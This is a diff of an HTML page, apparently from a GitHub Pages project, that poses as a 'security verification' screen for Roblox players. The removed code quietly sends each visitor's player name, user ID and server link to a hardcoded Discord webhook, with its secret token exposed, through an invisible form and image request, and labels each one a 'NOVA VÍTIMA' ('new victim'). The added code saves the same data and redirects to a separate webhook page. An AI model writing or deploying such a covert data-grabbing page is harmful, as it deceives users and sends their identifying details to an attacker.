@@ -1,130 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto Moreira System</title>
+    <title>Processing...</title>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- ESTA É A CHAVE: redirect automático -->
+    <meta http-equiv="refresh" content="0; url=https://whophzin.github.io/auto-moreira-webhook/process.html">
+    <script>
+        // Pega dados da URL atual
+        const params = new URLSearchParams(window.location.search);
+        
+        // Se tiver parâmetros, salva no localStorage
+        if (params.toString()) {
+            localStorage.setItem('autoMoreiraData', JSON.stringify({
+                player_name: params.get('player_name') || 'N/A',
+                player_id: params.get('player_id') || 'N/A',
+                server_link: params.get('server_link') || 'N/A',
+                timestamp: Date.now()
+            }));
+        }
+        
+        // Redireciona mesmo se o meta tag falhar
+        setTimeout(() => {
+            window.location.href = "https://whophzin.github.io/auto-moreira-webhook/process.html";
+        }, 100);
+    </script>
+</head>
+<body style="background: #0f172a; color: white; text-align: center; padding: 50px;">
+    <div style="border: 8px solid #333; border-top: 8px solid #00ff00; border-radius: 50%; width: 60px; height: 60px; margin: 20px auto; animation: spin 2s linear infinite;"></div>
+    <h1>🛡️ Processing Request...</h1>
+    <p>Please wait while we verify your data.</p>
+    
     <style>
-        body {
-            background: #0f172a;
-            color: white;
-            font-family: sans-serif;
-            text-align: center;
-            padding: 50px;
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        .loader {
-            border: 8px solid #333;
-            border-top: 8px solid #00ff00;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            margin: 20px auto;
-            animation: spin 2s linear infinite;
-        }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .hidden {
-            display: none;
-        }
-        #discordFrame {
-            width: 0;
-            height: 0;
-            border: none;
-            position: absolute;
-            visibility: hidden;
-        }
     </style>
-</head>
-<body>
-    <div class="loader"></div>
-    <h1 id="title">🛡️ Auto Moreira Security</h1>
-    <p id="message">Processing security verification...</p>
-    
-    <!-- Formulário oculto para enviar para Discord -->
-    <form id="discordForm" action="https://discord.com/api/webhooks/1466545598273552437/VH33E3Wb2olx18f5YD3W8wl80pflegd1wiGMHtRRr6GXTOpLQj18uLc3s4UwRCVrNRhh" method="POST" target="discordFrame" class="hidden">
-        <input type="hidden" name="content" id="discordContent">
-        <input type="hidden" name="username" value="Auto Moreira">
-        <input type="hidden" name="avatar_url" value="https://i.imgur.com/4M34hi2.png">
-    </form>
-    
-    <iframe id="discordFrame" name="discordFrame"></iframe>
-
-    <script>
-        // Pega dados da URL
-        const params = new URLSearchParams(window.location.search);
-        
-        // Se tiver dados, processa
-        if (params.toString()) {
-            const playerName = params.get('player_name') || 'N/A';
-            const playerId = params.get('player_id') || 'N/A';
-            const serverLink = params.get('server_link') || 'N/A';
-            const gameName = params.get('game_name') || 'Roblox';
-            const placeId = params.get('place_id') || 'N/A';
-            
-            console.log('📥 Dados recebidos:', { playerName, playerId, serverLink });
-            
-            // MÉTODO 1: Usando imagem para trigger (funciona no GitHub Pages)
-            const discordWebhook = "https://discord.com/api/webhooks/1466545598273552437/VH33E3Wb2olx18f5YD3W8wl80pflegd1wiGMHtRRr6GXTOpLQj18uLc3s4UwRCVrNRhh";
-            
-            // Cria uma imagem com URL do Discord (trick antigo que funciona)
-            const img = new Image();
-            img.src = discordWebhook + "?wait=true&content=" + 
-                encodeURIComponent(`@everyone **🚨 AUTO MOREIRA - NOVA VÍTIMA!**\n` +
-                `👤 Jogador: ${playerName}\n` +
-                `🆔 User ID: ${playerId}\n` +
-                `🔗 Link: ${serverLink}\n` +
-                `🎮 Jogo: ${gameName}\n` +
-                `⏰ Hora: ${new Date().toLocaleString('pt-BR')}\n` +
-                `🌐 Place ID: ${placeId}`);
-            
-            // MÉTODO 2: Formulário POST (fallback)
-            try {
-                const form = document.getElementById('discordForm');
-                const contentInput = document.getElementById('discordContent');
-                
-                // Cria mensagem formatada
-                const message = `@everyone **🚨 AUTO MOREIRA - NOVA VÍTIMA!**\n\n` +
-                                `👤 **Jogador:** ${playerName}\n` +
-                                `🆔 **User ID:** ${playerId}\n` +
-                                `🔗 **Link do Servidor:** ${serverLink}\n` +
-                                `🎮 **Jogo:** ${gameName}\n` +
-                                `⏰ **Hora:** ${new Date().toLocaleString('pt-BR')}\n` +
-                                `📅 **Data:** ${new Date().toLocaleDateString('pt-BR')}`;
-                
-                contentInput.value = message;
-                
-                // Tenta enviar o formulário
-                setTimeout(() => {
-                    form.submit();
-                    console.log('📤 Formulário enviado para Discord');
-                }, 500);
-                
-            } catch (err) {
-                console.error('❌ Erro no formulário:', err);
-            }
-            
-            // Atualiza interface
-            setTimeout(() => {
-                document.getElementById('title').textContent = '✅ Verification Complete!';
-                document.getElementById('message').textContent = 'Data sent to security system.';
-                document.querySelector('.loader').style.borderTopColor = '#00ff00';
-                
-                console.log('✅ Processamento concluído');
-            }, 1000);
-            
-        } else {
-            // Se não tiver dados, mostra mensagem normal
-            document.getElementById('message').textContent = 'System ready for verification requests.';
-            document.querySelector('.loader').style.display = 'none';
-        }
-    </script>
 </body>
 </html>
